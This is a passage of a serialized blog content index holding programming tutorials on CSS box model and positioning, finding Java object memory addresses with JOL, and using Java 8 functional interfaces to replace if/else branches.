元素与其它元素之间的距离可以使用边界（margin）来设置。边界也是可分为上、右、下、左。如下代码： \n div { margin : 20px 10px 15px 30px ; } \n \n 1 也可以分开写： \n div { \n     margin-top : 20px ; \n     margin-right : 10px ; \n     margin-bottom : 15px ; \n     margin-left : 30px ; \n } \n \n 1 2 3 4 5 6 如果上下左右的边界都为10px;可以这么写： \n div {   margin : 10px ; } \n \n 1 如果上下边界一样为10px，左右一样为20px，可以这么写： \n div {   margin : 10px 20px ; } \n \n 1 总结一下：padding和margin的区别，padding在边框里，margin在边框外。 \n 盒模型--填充 \n 元素内容与边框之间是可以设置距离的，称之为填充。填充也可分为上、右、下、左。如下代码： \n div { padding : 20px 10px15px 30px ; } \n \n 1 顺序一定不要搞混。可以分开写上面代码： \n div { \n     padding-top : 20px ; \n     padding-right : 10px ; \n     padding-bottom : 15px ; \n     padding-left : 30px ; \n } \n \n 1 2 3 4 5 6 如果上、右、下、左的填充都为10px;可以这么写 \n div { padding : 10px ; } \n \n 1 如果上下填充一样为10px，左右一样为20px，可以这么写： \n div { padding : 10px 20px ; } \n \n 1 #  盒模型代码简写 \n 还记得在讲盒模型时外边距(margin)、内边距(padding)和边框(border)设置上下左右四个方向的边距是按照顺时针方向设置的：上右下左。具体应用在margin和padding的例子如下： \n margin : 10px 15px 12px 14px ; /*上设置为10px、右设置为15px、下设置为12px、左设置为14px*/ \n \n 1 通常有下面三种缩写方法: \n \n 如果top、right、bottom、left的值相同，如下面代码： \n \n margin : 10px 10px 10px 10px ; \n \n 1 可缩写为： \n margin : 10px ; \n \n 1 \n 如果top和bottom值相同、left和 right的值相同，如下面代码： \n \n margin : 10px 20px 10px 20px ; \n \n 1 可缩写为： \n margin : 10px 20px ; \n \n 1 \n 如果left和right的值相同，如下面代码： \n \n margin : 10px 20px 30px 20px ; \n \n 1 可缩写为： \n margin : 10px 20px 30px ; \n \n 1 注意：padding、border的缩写方法和margin是一致的。 \n 颜色值缩写 \n 关于颜色的css样式也是可以缩写的，当你设置的颜色是16进制的色彩值时，如果每两位的值相同，可以缩写一半。 \n 例子1： \n p { color : #000000 ; } \n \n 1 可以缩写为： \n p { color :  #000 ; } \n \n 1 例子2： \n p { color :  #336699 ; } \n \n 1 可以缩写为： \n p { color :  #369 ; } \n \n 1 #  CSS布局模型 \n css布局模型 \n 清楚了CSS 盒模型的基本概念、 盒模型类型， 我们就可以深入探讨网页布局的基本模型了。布局模型与盒模型一样都是 CSS 最基本、 最核心的概念。 但布局模型是建立在盒模型基础之上，又不同于我们常说的 CSS 布局样式或 CSS 布局模板。如果说布局模型是本，那么 CSS 布局模板就是末了，是外在的表现形式。 \n CSS包含3种基本的布局模型，用英文概括为：Flow、Layer 和 Float。 \n 在网页中，元素有三种布局模型： \n \n \n 流动模型（Flow） \n \n \n 浮动模型 (Float) \n \n \n 层模型（Layer） \n 流动模型 \n 流动（Flow）：自上而下。 \n 先来说一说流动模型，流动（Flow）是默认的网页布局模式。也就是说网页在默认状态下的 HTML 网页元素都是根据流动模型来分布网页内容的。 \n 流动布局模型具有2个比较典型的特征： \n 第一点，块状元素都会在所处的包含元素内自上而下按顺序垂直延伸分布，因为在默认状态下，块状元素的宽度都为100%。实际上，块状元素都会以行的形式占据位置。如右侧代码编辑器中三个块状元素标签(div，h1，p)宽度显示为100%。 \n 第二点，在流动模型下，内联元素都会在所处的包含元素内从左到右水平分布显示。（内联元素可不像块状元素这么霸道独占一行） \n 右侧代码编辑器中内联元素标签a、span、em、strong都是内联元素。 \n 浮动模型 \n 块状元素这么霸道都是独占一行，如果现在我们想让两个块状元素并排显示，怎么办呢？不要着急，设置元素浮动就可以实现这一愿望。任何元素在默认情况下是不能浮动的，但可以用CSS定义为浮动，如div、p、table、img等元素都可以被定义为浮动。如下代码可以实现两个div元素一行显示。 \n div { \n     width : 200px ; \n     height : 200px ; \n     border : 2px red solid ; \n     float : left ; \n } \n\n<div id= "div1" ></div>\n\n<div id= "div2" ></div>\n \n 1 2 3 4 5 6 7 8 9 10 注意：设置浮动的同时一定要先设置块状元素的宽度，且需要浮动的几个元素宽度加起来一定要小于容器元素的宽度。 \n 层模型 \n 什么是层布局模型？层布局模型就像是图像软件PhotoShop中非常流行的图层编辑功能一样，每个图层能够精确定位操作，但在网页设计领域，由于网页大小的活动性，层布局没能受到热捧。但是在网页上局部使用层布局还是有其方便之处的。下面我们来学习一下html中的层布局。 \n 如何让html元素在网页中精确定位，就像图像软件PhotoShop中的图层一样可以对每个图层能够精确定位操作。CSS定义了一组定位（positioning）属性来支持层布局模型。 \n 层模型有三种形式： \n \n \n 绝对定位(position: absolute) \n \n \n 相对定位(position: relative) \n \n \n 固定定位(position: fixed) \n 层模型--绝对定位（相对于父类） \n 如果想为元素设置层模型中的绝对定位，需要设置position:absolute(表示绝对定位)，这条语句的作用将元素从文档流中拖出来，然后使用left、right、top、bottom属性相对于其最接近的一个具有定位属性的父包含块进行绝对定位。如果不存在这样的包含块，则相对于body元素，即相对于浏览器窗口。 \n 如下面代码可以实现div元素相对于浏览器窗口向右移动100px，向下移动50px。 \n div { \n     width : 200px ; \n     height : 200px ; \n     border : 2px red solid ; \n     position : absolute ; \n     left : 100px ; \n     top : 50px ; \n } \n\n<div id= "div1" ></div>\n \n 1 2 3 4 5 6 7 8 9 10 #  层模型--相对定位（相对于以前） \n 如果想为元素设置层模型中的相对定位，需要设置position:relative（表示相对定位），它通过left、right、top、bottom属性确定元素在正常文档流中的偏移位置。相对定位完成的过程是首先按static(float)方式生成一个元素(并且元素像层一样浮动了起来)，然后相对于以前的位置移动，移动的方向和幅度由left、right、top、bottom属性确定，偏移前的位置保留不动。 \n 如下代码实现相对于以前位置向下移动50px，向右移动100px; \n #div1 { \n     width : 200px ; \n     height : 200px ; \n     border : 2px red solid ; \n     position : relative ; \n     left : 100px ; \n     top : 50px ; \n } \n\n<div id= "div1" ></div>\n \n 1 2 3 4 5 6 7 8 9 10 #  层模型--固定定位（相对于网页窗口） \n 固定住某一坐标。 \n fixed：表示固定定位，与absolute定位类型类似，但它的相对移动的坐标是视图（屏幕内的网页窗口）本身。由于视图本身是固定的，它不会随浏览器窗口的滚动条滚动而变化，除非你在屏幕中移动浏览器窗口的屏幕位置，或改变浏览器窗口的显示大小，因此固定定位的元素会始终位于浏览器窗口内视图的某个位置，不会受文档流动影响，这与background-attachment:fixed?属性功能相同。以下代码可以实现相对于浏览器视图向右移动100px，向下移动50px。并且拖动滚动条时位置固定不变。 \n #div1 { \n     width : 200px ; \n     height : 200px ; \n     border : 2px red solid ; \n     position : fixed ; \n     left : 100px ; \n     top : 50px ; \n } \n \n 1 2 3 4 5 6 7 8 #  Relative与Absolute组合使用 \n 小伙伴们学习了12-6小节的相对定位的方法：使用position:absolute可以实现被设置元素相对于浏览器（body）设置定位以后，大家有没有想过可不可以相对于其它元素进行定位呢？答案是肯定的，当然可以。使用position:relative来帮忙，但是必须遵守下面规范： \n 1、参照定位的元素必须是相对定位元素的前辈元素： \n < div   id = " box1 " > \x3c!--参照定位的元素--\x3e \n\n < div   id = " box2 " > 相对参照元素进行定位 </ div > \x3c!--相对定位元素--\x3e \n\n </ div > \n \n 1 2 3 4 5 从上面代码可以看出box1是box2的父元素（父元素当然也是前辈元素了）。 \n 2、参照定位的元素必须加入position:relative; \n #box1 { \n     width : 200px ; \n     height : 200px ; \n     position : relative ; \n } \n \n 1 2 3 4 5 3、定位元素加入position:absolute，便可以使用top、bottom、left、right来进行偏移定位了。 \n #box2 { \n     position : absolute ; \n     top : 20px ; \n     left : 30px ; \n } \n \n 1 2 3 4 5 这样box2就可以相对于父元素box1定位了（这里注意参照物就可以不是浏览器了，而可以自由设置了）。 \n'},{title:"Memory Address of Objects in Java",frontmatter:{title:"Memory Address of Objects in Java",date:"2021-12-24 20:46:55",tags:["java"],categories:"back-end-java",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/java/java-object-memory-address.html",relativePath:"blogs/java/java-object-memory-address.md",key:"v-b919e6d6",path:"/blogs/java/java-object-memory-address.html",headers:[{level:2,title:"1. Overview",slug:"_1-overview"},{level:2,title:"2. Dependency",slug:"_2-dependency"},{level:2,title:"3. Memory Address",slug:"_3-memory-address"},{level:2,title:"4. Identity Hash Code",slug:"_4-identity-hash-code"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:' java-stack-heap \n java-stack-heap \n Java Heap Space vs Stack – Memory Allocation in Java \n Reference Variable in Java \n 1. Overview \n In this quick tutorial, we\'re going to see how to find the memory address of objects in Java. \n Before going any further, it\'s worth mentioning that the memory layout of runtime data areas is not part of the JVM specification and is left to the discretion of the implementor. Therefore, each JVM implementation may have a different strategy to layout objects and arrays in memory. This will, in turn, affect the memory addresses. \n In this tutorial, we\'re focusing on one specific JVM implementation: the HotSpot JVM. We also may use the JVM and HotSpot JVM terms interchangeably throughout the tutorial. \n 2. Dependency \n To find the memory address of objects in the JVM, we\'re going to use the Java Object Layout (JOL) tool. Therefore, we need to add the jol-core dependency: \n < dependency > \n     < groupId > org.openjdk.jol </ groupId > \n     < artifactId > jol-core </ artifactId > \n     < version > 0.10 </ version > \n </ dependency > \n \n 1 2 3 4 5 #  3. Memory Address \n To find the memory address of a particular object in the JVM, we can use the addressOf() method: \n String  answer  =   "42" ; \n\n System . out . println ( "The memory address is "   +  VM . current ( ) . addressOf ( answer ) ) ; \n \n 1 2 3 This will print:\nThe memory address is 31864981224\nThere are different compressed reference modes in the HotSpot JVM. Because of these modes, this value may not be completely accurate. Therefore, we shouldn\'t go and perform some native memory manipulations based on this address, as it may cause weird memory corruptions. \n Also, memory addresses in most JVM implementations are subject to change as the GC moves the objects around from time to time. \n 4. Identity Hash Code \n There\'s a common misconception that the memory addresses of objects in the JVM are represented as part of their default toString implementations, such as java.lang.Object@60addb54. That is, many think that the “60addb54” is the memory address of that particular object. \n Let\'s check this assumption: \n Object  obj  =   new   Object ( ) ; \n\n System . out . println ( "Memory address: "   +  VM . current ( ) . addressOf ( obj ) ) ; \n System . out . println ( "toString: "   +  obj ) ; \n System . out . println ( "hashCode: "   +  obj . hashCode ( ) ) ; \n System . out . println ( "hashCode: "   +   System . identityHashCode ( obj ) ) ; \n \n 1 2 3 4 5 6 This will print the following: \n Memory address: 31879960584\ntoString: java.lang.Object@60addb54\nhashCode: 1622006612\nhashCode: 1622006612\n \n Quite interestingly, the "60addb54" is the hexadecimal version of the hash code, which is 1622006612. The hashCode() method is one of the common methods for all Java objects. When we don\'t declare a hashCode() method for a class, Java will use the identity hash code for it. \n As shown above, the identity hash code (that part after @ in toString) and the memory address are different. \n'},{title:"妙用Java 8中的 Function接口 消灭if...else...",frontmatter:{title:"妙用Java 8中的 Function接口 消灭if...else...",date:"2022-03-06T10:58:17.000Z",tags:["java8","function"],categories:"back-end-java",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/java/java8_function_reduce_ifelse.html",relativePath:"blogs/java/java8_function_reduce_ifelse.md",key:"v-5beda655",path:"/blogs/java/java8_function_reduce_ifelse.html",headers:[{level:2,title:"函数式接口",slug:"函数式接口"},{level:3,title:"匿名函数和闭包 的体现",slug:"匿名函数和闭包-的体现"},{level:3,title:"函数式接口：",slug:"函数式接口-2"},{level:2,title:"Function 函数式接口",slug:"function-函数式接口"},{level:3,title:"FunctionalInterface接口",slug:"functionalinterface接口"},{level:3,title:"Supplier供给型函数",slug:"supplier供给型函数"},{level:3,title:"Consumer消费型函数",slug:"consumer消费型函数"},{level:3,title:"Runnable无参无返回型函数",slug:"runnable无参无返回型函数"},{level:3,title:"Function函数",slug:"function函数"},{level:3,title:"BiFunction 函数",slug:"bifunction-函数"},{level:3,title:"BinaryOperator函数",slug:"binaryoperator函数"},{level:3,title:"Predicate 函数",slug:"predicate-函数"},{level:2,title:"使用小技巧",slug:"使用小技巧"},{level:3,title:"处理抛出异常的if",slug:"处理抛出异常的if"},{level:3,title:"处理if分支操作",slug:"处理if分支操作"},{level:3,title:"如果存在值执行消费操作，否则执行基于空的操作",slug:"如果存在值执行消费操作-否则执行基于空的操作"},{level:2,title:"结尾",slug:"结尾"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:' 函数式接口 \n 匿名函数和闭包 的体现 \n \n \n java中无法把一个函数作为参数进行传递，返回结果也无法是一个函数 \n \n \n 参数和返回只能是基本变量和实例化的对象 \n 函数式接口： \n \n 如果一个接口只有一个抽象方法，则是函数式接口。 \n 如果某个接口上声明了FunctionalInterface注解，则是函数式接口。 \n 如果接口只有一个抽象方法，但是没有声明FunctionalInterface,依旧是。 \n 函数式接口必须要有一个抽象方法， 如果接种中定义的抽象方法和Object类中的方法名相同，则不能认为是一个 函数式接口，因为对象或多或少都会继承Object。接口的抽象方法不会加1。 \n lambda表达式必须是方法引用或构造函数引用。 \n 高阶函数：如果一个函数接收一个函数作为参数，或者返回一个函数作为返回值，那么该函数就叫做高阶函数 \n 接口中也可以定义方法，方法用default修饰。默认方法，保证和老版本代码兼容。实现类默认拥有 接口中的默认方法。 \n java中lambda是一个对象，其它语言中是函数,称为函数式接口. \n 函数式接口必须有一个上下文。 MyInterface my = () -> System.out.println("123"); 必须这样（）->{} 才能存在，MyInterface就是上下文，用来提供类型推断 \n \n //函数时接口 \n interface  接口名 {   void   test ( ) ;   } \n\n //非函数式接口 \n interface  接口名 {   void   test ( ) ;   void   toString ( ) ;   } \n\n //函数式接口 \n interface  接口名\n { \n   void   test ( ) ; \n\n   //因为这里重写来Object类中的方法 \n   String   toString ( ) ; \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 在开发过程中经常会使用if...else...\n进行判断抛出异常、分支处理等操作。这些if...else...\n充斥在代码中严重影响了代码代码的美观，这时我们可以利用Java 8的Function接口来消灭if...else...。 \n if   ( . . . ) { \n     throw   new   RuntimeException ( "出现异常了" ) ；\n } \n\n if   ( . . . ) { \n     doSomething ( ) ; \n }   else   { \n     doOther ( ) ; \n } \n \n 1 2 3 4 5 6 7 8 9 #  Function 函数式接口 \n 使用注解@FunctionalInterface标识，并且只包含一个抽象方法的接口是函数式接口。函数式接口主要分为Supplier供给型函数、Consumer消费型函数、Runnable无参无返回型函数和Function有参有返回型函数。FunctionalInterface没有实际作用，只是起标识作用。 \n Function可以看作转换型函数\n FunctionalInterface接口 \n /**\n 信息性注释类型，用于指示接口类型声明旨在成为Java语言规范定义的功能接口。\n 从概念上讲，功能接口仅具有一种抽象方法。由于默认方法具有实现，因此它们不是抽象的。如果接口声明的抽象方法覆盖了java.lang.Object的公共方法之一，则该方法也不会计入接口的抽象方法计数，因为该接口的任何实现都将具有java.lang.Object或其他地方的实现。\n （这里表达的意思是如果接口中的方法定义和object中的方法一致，则不能算是函数式方法）\n\n  请注意，可以使用lambda表达式，方法引用或构造函数引用来创建功能接口的实例。\n  如果使用此注释类型对类型进行注释，则编译器需要生成错误消息，除非：\n    1该类型是接口类型，而不是注释类型，枚举或类。\n    2带注释的类型满足功能接口的要求。\n\n但是，编译器会将满足功能接口定义的任何接口视为功能接口，而不管接口声明中是否存在FunctionalInterface批注。\n *\n * @jls 4.3.2. The Class Object\n * @jls 9.8 Functional Interfaces\n * @jls 9.4.3 Interface Method Body\n * @since 1.8\n */ \n @Documented \n @Retention ( RetentionPolicy . RUNTIME ) \n @Target ( ElementType . TYPE ) \n public   @interface   FunctionalInterface   { } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 #  Supplier供给型函数 \n Supplier的表现形式为不接受参数、只返回数据 \n /**\n * 代表结果的提供者。\n * 不需要每次调用supplier都返回新的或不同的结果。\n * @param <T> 该supplier提供的结果类型\n * @since 1.8\n */ \n @FunctionalInterface \n public   interface   Supplier < T >   { \n\n     /**\n     * Gets a result.\n     *\n     * @return a result\n     */ \n     T   get ( ) ; \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 #  Consumer消费型函数 \n Consumer消费型函数和Supplier刚好相反。Consumer接收一个参数，没有返回值 \n /**\n * 表示一个接受单个输入参数且不返回结果的操作。与大多数其他功能接口不同，消费者有望通过副作用进行操作。\n (副作用，是指传入参数T 可能会被修改)\n *\n * 这是一个功能接口，其功能方法为accept（Object）。\n\n 这是一个功能接口，因此可以用作lambda表达式或方法引用的分配目标\n *\n * @param <T> 操作输入的类型\n *\n * @since 1.8\n */ \n @FunctionalInterface \n public   interface   Consumer < T >   { \n\n     /**\n     * 对给定的参数执行此操作。\n     *\n     * @param t 输入的参数\n     */ \n     void   accept ( T  t ) ; \n\n     /**\n     返回一个组成的使用者，该使用者依次执行此操作，然后执行after操作。如果执行任何一个操作均引发异常，则将其中继到组合操作的调用方。如果执行此操作引发异常，则将不执行after操作。\n     *\n     * @param 该操作后要执行的操作\n     * @return 一个组合Consumer，该使用者依次执行此操作，然后执行after操作\n     * @throws NullPointerException if {@code after} is null\n     */ \n     default   Consumer < T >   andThen ( Consumer < ?   super   T >  after )   { \n         Objects . requireNonNull ( after ) ; \n         return   ( T  t )   ->   {   accept ( t ) ;  after . accept ( t ) ;   } ; \n     } \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 #  Runnable无参无返回型函数 \n Runnable的表现形式为即没有参数也没有返回值 \n /**\n * Runnable接口应该由其实例旨在由线程执行的任何类实现。 该类必须定义一个名为run的无参数方法。\n * 此接口旨在为希望在活动时执行代码的对象提供通用协议。 例如， Runnable是由类Thread实现的。 处于活动状态仅意味着线程已启动且尚未停止。\n * 此外， Runnable提供了使类处于活动状态而不是子类化Thread 。 通过实例化Thread实例并将自身作为目标传入，实现Runnable的类可以在不继承Thread的情况下运行。 在大多数情况下，如果您只打算覆盖run()方法而不打算覆盖其他Thread方法，则应该使用Runnable接口。 这很重要，因为除非程序员打算修改或增强类的基本行为，否则类不应被子类化。\n * 自从：\n * JDK1.0\n * 也可以看看：\n * Thread ， java.util.concurrent.Callable\n * 作者：\n * 阿瑟·范霍夫\n * @author  Arthur van Hoff\n * @see     Thread\n * @see     java.util.concurrent.Callable\n * @since   JDK1.0\n */ \n @FunctionalInterface \n public   interface   Runnable   { \n     /**\n     * 当使用实现接口Runnable的对象创建线程时，启动线程会导致在单独执行的线程中调用对象的run方法。\n     * 方法run的一般约定是它可以采取任何行动。\n     * 也可以看看：\n     * Thread.run()\n     * @see     Thread#run()\n     */ \n     public   abstract   void   run ( ) ; \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 #  Function函数 \n 表现形式为接收一个参数，并返回一个值。Supplier、Consumer和Runnable可以看作Function的一种特殊表现形式。 \n \n /**\n * 接收一个参数返回一个结果\n\n * @param <T> 输入参数类型\n * @param <R> 返回结果类型\n *\n * @since 1.8\n */ \n @FunctionalInterface \n public   interface   Function < T ,   R >   { \n\n     /**\n     * 应用此function到给定的参数\n     * @param t 输入参数\n     * @return 返回结果\n     */ \n     R   apply ( T  t ) ; \n\n     /**\n     * 返回一个组合函数，该函数首先将before函数应用于其输入，然后将该函数应用于结果。如果对任一函数的求值抛      出异常，则将其中继到组合函数的调用方。\n     * @param <V> the type of input to the {@code before} function, and to the\n     *           composed function\n     * @param before 应用此功能之前要应用的功能\n     * @return 一个组合函数，首先应用before函数，然后再应用此函数\n     * @throws NullPointerException if before is null\n     *\n     * @see #andThen(Function)\n     */ \n     default   < V >   Function < V ,   R >   compose ( Function < ?   super   V ,   ?   extends   T >  before )   { \n         Objects . requireNonNull ( before ) ; \n       //先执行before动作获得一个结果，让你后将获得的结果应用于compose function \n         return   ( V  v )   ->   apply ( before . apply ( v ) ) ; \n     } \n\n     /**\n     返回一个组合函数，该函数首先将此函数应用于其输入，然后将after函数应用于结果。如果对任一函数的求值抛出异常，则将其中继到组合函数的调用方。\n     * @param <V> the type of output of the {@code after} function, and of the\n     *           composed function\n     * @param after 应用此功能后要应用的功能\n     * @return 一个组合函数，首先应用此函数，然后应用after函数\n     * @throws NullPointerException if after is null\n     * @see #compose(Function)\n     */ \n     default   < V >   Function < T ,   V >   andThen ( Function < ?   super   R ,   ?   extends   V >  after )   { \n         Objects . requireNonNull ( after ) ; \n       //首先应用andThen function,得到一个结果，然后将此结果应用于after \n         return   ( T  t )   ->  after . apply ( apply ( t ) ) ; \n     } \n\n     /**\n     * 返回始终返回其输入参数的函数。\n     *\n     * @param <T> 函数的输入和输出对象的类型\n     * @return 始终返回其输入参数的函数\n     */ \n     static   < T >   Function < T ,   T >   identity ( )   { \n         return  t  ->  t ; \n     } \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 #  BiFunction 函数 \n 表示一个接受两个参数并产生结果的函数。 \n /*\n\n 表示一个接受两个参数并产生结果的函数。这是Function的两个领域。这是一个功能接口，其功能方法为apply（Object，Object）。\n  这是一个功能接口，因此可以用作lambda表达式或方法引用的分配目标。\n\n * @param <T> 第一个参数\n * @param <U> 第二个参数\n * @param <R> 返回结果类型\n *\n * @see Function\n * @since 1.8\n */ \n @FunctionalInterface \n public   interface   BiFunction < T ,   U ,   R >   { \n\n     /**\n     * 将此函数应用于给定参数。\n     *\n     * @param t 第一个参数\n     * @param u 第二个参数\n     * @return 结果\n     */ \n     R   apply ( T  t ,   U  u ) ; \n\n     /**\n    返回一个组合函数，该函数首先将此函数应用于其输入，然后将after函数应用于结果。如果对任一函数的求值抛出异常，则将其中继到组合函数的调用方。\n     * @param <V> after函数和组合函数的输出类型\n     * @param after 应用此功能后要应用的功能\n     * @return 一个组合函数，首先应用此函数，然后应用after函数\n     * applies the {@code after} function\n     * @throws NullPointerException if after is null\n     */ \n     default   < V >   BiFunction < T ,   U ,   V >   andThen ( Function < ?   super   R ,   ?   extends   V >  after )   { \n         Objects . requireNonNull ( after ) ; \n         return   ( T  t ,   U  u )   ->  after . apply ( apply ( t ,  u ) ) ; \n     } \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 #  BinaryOperator函数 \n /**\n 表示对两个相同类型的操作数的运算，产生与该操作数相同类型的结果。对于操作数和结果均为相同类型的情况，这是BiFunction的特殊化。\n * 这是一个函数式接口，函数式方法是 {@link #apply(Object, Object)}.\n *\n * @param <T> 操作数的类型和运算符的结果\n *\n * @see BiFunction\n * @see UnaryOperator\n * @since 1.8\n */ \n @FunctionalInterface \n public   interface   BinaryOperator < T >   extends   BiFunction < T , T , T >   { \n     /**\n     *返回一个BinaryOperator，它根据指定的Comparator返回两个元素中的较小者\n     * @param <T> 比较器的输入参数的类型\n     * @param 比较器，用于比较两个值\n     * @return 一个BinaryOperator，根据提供的Comparator返回较小的操作数\n     * @throws NullPointerException if the argument is null\n     */ \n     public   static   < T >   BinaryOperator < T >   minBy ( Comparator < ?   super   T >  comparator )   { \n         Objects . requireNonNull ( comparator ) ; \n         return   ( a ,  b )   ->  comparator . compare ( a ,  b )   <=   0   ?  a  :  b ; \n     } \n\n     /**\n     返回BinaryOperator，该BinaryOperator根据指定的Comparator返回两个元素中的较大者。\n     * @param <T> 比较器的输入参数的类型\n     * @param 比较器，用于比较两个值\n     * @return 一个BinaryOperator，根据提供的Comparator返回较大的操作数\n     * @throws NullPointerException if the argument is null\n     */ \n     public   static   < T >   BinaryOperator < T >   maxBy ( Comparator < ?   super   T >  comparator )   { \n         Objects . requireNonNull ( comparator ) ; \n         return   ( a ,  b )   ->  comparator . compare ( a ,  b )   >=   0   ?  a  :  b ; \n     } \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 #  Predicate 函数 \n \n\n /**\n * 表示一个参数的谓词（布尔值函数）。这是一个功能接口，其功能方法为test（Object）。\n *\n * @param <T> the type of the input to the predicate\n *\n * @since 1.8\n */ \n @FunctionalInterface \n public   interface   Predicate < T >   { \n\n     /**\n     * 根据给定参数评估此谓词。 true或false\n     *\n     * @param t the input argument\n     * @return {@code true} if the input argument matches the predicate,\n     * otherwise {@code false}\n     */ \n     boolean   test ( T  t ) ; \n\n      /**\n     * 返回表示该谓词与另一个谓词的短路逻辑与的组合谓词。在评估组合谓词时，如果该谓词为假，则不会评估另一个谓词。\n    在评估任一谓词过程中引发的任何异常都会中继给调用者；如果对此谓词的求值抛出异常，则不会对另一个谓词求值。\n     *\n     * @param other a predicate that will be logically-ANDed with this\n     *              predicate\n     * @return a composed predicate that represents the short-circuiting logical\n     * AND of this predicate and the {@code other} predicate\n     * @throws NullPointerException if other is null\n     */ \n     default   Predicate < T >   and ( Predicate < ?   super   T >  other )   { \n         Objects . requireNonNull ( other ) ; \n         return   ( t )   ->   test ( t )   &&  other . test ( t ) ; \n     } \n\n     /**\n     * 返回表示此谓词逻辑否定的谓词。\n     * @return a predicate that represents the logical negation of this\n     * predicate\n     */ \n     default   Predicate < T >   negate ( )   { \n         return   ( t )   ->   ! test ( t ) ; \n     } \n\n     /**\n     *返回一个组成的谓词，该谓词表示此谓词和另一个谓词的短路逻辑或。在评估组合谓词时，如果该谓词为true，则不会评估另一个谓词。\n     *\n   在评估任一谓词过程中引发的任何异常都会中继给调用者；如果对此谓词的求值抛出异常，则不会对另一个谓词求值。\n     * @param other a predicate that will be logically-ORed with this\n     *              predicate\n     * @return a composed predicate that represents the short-circuiting logical\n     * OR of this predicate and the {@code other} predicate\n     * @throws NullPointerException if other is null\n     */ \n     default   Predicate < T >   or ( Predicate < ?   super   T >  other )   { \n         Objects . requireNonNull ( other ) ; \n         return   ( t )   ->   test ( t )   ||  other . test ( t ) ; \n     } \n\n     /**\n     *返回一个谓词，该谓词根据Objects.equals（Object，Object）测试两个参数是否相等。\n     *\n     * @param <T> the type of arguments to the predicate\n     * @param targetRef the object reference with which to compare for equality,\n     *               which may be {@code null}\n     * @return a predicate that tests if two arguments are equal according\n     * to {@link Objects#equals(Object, Object)}\n     */ \n     static   < T >   Predicate < T >   isEqual ( Object  targetRef )   { \n         return   ( null   ==  targetRef ) \n                 ?   Objects :: isNull \n                 :  object  ->  targetRef . equals ( object ) ; \n     } \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 #  使用小技巧 \n 处理抛出异常的if \n \n 定义函数 \n \n 定义一个抛出异常的形式的函数式接口, 这个接口只有参数没有返回值是个消费型接口 \n /**\n * 抛异常接口\n **/ \n @FunctionalInterface \n public   interface   ThrowExceptionFunction   { \n\n     /**\n     * 抛出异常信息\n     *\n     * @param message 异常信息\n     * @return void\n     **/ \n     void   throwMessage ( String  message ) ; \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 创建工具类VUtils并创建一个isTure方法，方法的返回值为刚才定义的函数式接口-ThrowExceptionFunction。ThrowExceptionFunction的接口实现逻辑为当参数b为true时抛出异常. \n \n 编写判断方法 \n \n /**\n *  如果参数为true抛出异常\n *\n * @param b\n * @return com.example.demo.func.ThrowExceptionFunction\n **/ \n public   static   ThrowExceptionFunction   isTure ( boolean  b ) { \n\n     return   ( errorMessage )   ->   { \n         if   ( b ) { \n             throw   new   RuntimeException ( errorMessage ) ; \n         } \n     } ; \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 \n 使用方式 \n \n 调用工具类参数参数后，调用函数式接口的throwMessage方法传入异常信息。当出入的参数为false时正常执行。 \n 处理if分支操作 \n \n 定义函数式接口 \n \n 创建一个名为BranchHandle的函数式接口，接口的参数为两个Runnable接口。这两个两个Runnable接口分别代表了为true或false时要进行的操作 \n /**\n * 分支处理接口\n **/ \n @FunctionalInterface \n public   interface   BranchHandle   { \n\n     /**\n     * 分支操作\n     *\n     * @param trueHandle 为true时要进行的操作\n     * @param falseHandle 为false时要进行的操作\n     * @return void\n     **/ \n     void   trueOrFalseHandle ( Runnable  trueHandle ,   Runnable  falseHandle ) ; \n\n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \n 编写判断方法 \n \n 创建一个名为isTureOrFalse的方法，方法的返回值为刚才定义的函数式接口-BranchHandle \n /**\n * 参数为true或false时，分别进行不同的操作\n *\n * @param b\n * @return com.example.demo.func.BranchHandle\n **/ \n public   static   BranchHandle   isTureOrFalse ( boolean  b ) { \n\n     return   ( trueHandle ,  falseHandle )   ->   { \n         if   ( b ) { \n            trueHandle . run ( ) ; \n         }   else   { \n            falseHandle . run ( ) ; \n         } \n     } ; \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \n 使用方式 \n \n 参数为true时，执行trueHandle \n 参数为false时，执行falseHandle \n 如果存在值执行消费操作，否则执行基于空的操作 \n \n 定义函数 \n \n 创建一个名为PresentOrElseHandler的函数式接口，接口的参数一个为Consumer接口。一个为Runnable,分别代表值不为空时执行消费操作和值为空时执行的其他操作 \n /**\n * 空值与非空值分支处理\n */ \n public   interface   PresentOrElseHandler < T   extends   Object >   { \n\n     /**\n     * 值不为空时执行消费操作\n     * 值为空时执行其他的操作\n     *\n     * @param action 值不为空时，执行的消费操作\n     * @param emptyAction 值为空时，执行的操作\n     * @return void\n     **/ \n    void   presentOrElseHandle ( Consumer < ?   super   T >  action ,   Runnable  emptyAction ) ; \n\n } \n \n 1 2 3 4 5 6 7 8 9 10 11 